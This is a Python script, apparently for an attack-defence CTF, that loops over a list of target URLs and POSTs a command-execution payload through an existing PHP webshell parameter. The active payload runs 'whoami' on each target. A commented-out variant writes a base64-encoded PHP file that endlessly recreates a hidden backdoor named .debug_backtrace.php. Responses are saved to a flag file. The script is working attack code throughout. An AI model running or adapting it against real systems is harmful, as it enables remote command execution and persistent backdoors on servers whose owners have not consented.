# --coding:utf-8 --
import requests



def APT_flag(url,proxy=None):
    res=requests.post(url,data=exp,headers=headers,timeout=5,proxies=proxy)
    print(res.text)
    print(res.text,file=f_file)



headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    "DCTOKENED": "XYXNhMTI0Quuuu734y83grw=="
}


# proxy = {"http":"http://127.0.0.1:8080"}

# exp = "U2Uid3i1d=$abc = 'You_is_Dsb.php';$data = 'PD9waHAKCXNldF90aW1lX2xpbWl0KDApOwoJaWdub3JlX3VzZXJfYWJvcnQoMSk7Cgl3aGlsZSgxKXsKICAgICRmaWxlID0gZm9wZW4oIi5kZWJ1Z19iYWNrdHJhY2UucGhwIiwgInciKTsKICAgICR0eHQgPSAiUEQ5d2FIQWdDa0JsY25KdmNsOXlaWEJ2Y25ScGJtY29NQ2s3Q2lSaElEMGdJbjRyWkNncElsNGlJWHNyZTMwaU93b2tZaUE5SUNSN0pHRjlXemMxT0Rrd01WMDdDbVYyWVd3b0lseHVJaTRpWEhJaUxpUmlLVHNLUHo0PSI7CiAgICAkY29udGVudCA9IGJhc2U2NF9kZWNvZGUoJHR4dCk7CiAgICBmd3JpdGUoJGZpbGUsICRjb250ZW50KTsKICAgIGZjbG9zZSgkZmlsZSk7CgkJdXNsZWVwKDEwMCk7Cgl9';$detxt = base64_decode($data);file_put_contents($abc, $detxt);echo 'successfully.';"
exp = "U2Uid3i1d=system('whoami');"

with open('APT_list.txt', 'r') as file,open('flag_other.txt', 'a') as f_file:
    lines = file.readlines()
    for urls in lines:
        print(urls.strip())
        APT_flag(urls.strip())


"""# 创建一个空列表来存储url地址和逗号后的密码
data = []

# 遍历每一行并拆分成IP地址和逗号后的内容
for line in lines:
    parts = line.strip().split(',')
    if len(parts) == 2:
        ip, content = parts
        data.append((ip, content))"""